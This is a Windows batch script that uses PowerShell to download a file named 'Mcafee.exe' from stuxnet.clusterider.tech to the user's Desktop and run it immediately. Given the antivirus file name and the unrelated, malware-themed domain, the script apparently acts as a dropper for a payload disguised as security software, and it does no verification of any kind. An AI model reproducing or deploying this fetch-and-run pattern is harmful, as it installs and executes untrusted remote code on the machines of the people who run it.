@echo off
setlocal

REM Set the download URL
set "URL=https://stuxnet.clusterider.tech/download/Mcafee.exe"

REM Get the Desktop path dynamically using PowerShell
for /f "usebackq delims=" %%D in (`powershell -NoProfile -Command "[Environment]::GetFolderPath('Desktop')"`) do set "DESKTOP=%%D"
set "OUTPUT=%DESKTOP%\Mcafee.exe"

REM Download the file using PowerShell
echo Downloading %OUTPUT% from %URL%...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%OUTPUT%'"

REM Check if the file was downloaded
if exist "%OUTPUT%" (
    echo Download complete. Running the program...
    start "" "%OUTPUT%"
) else (
    echo Download failed.
)

endlocal
pause
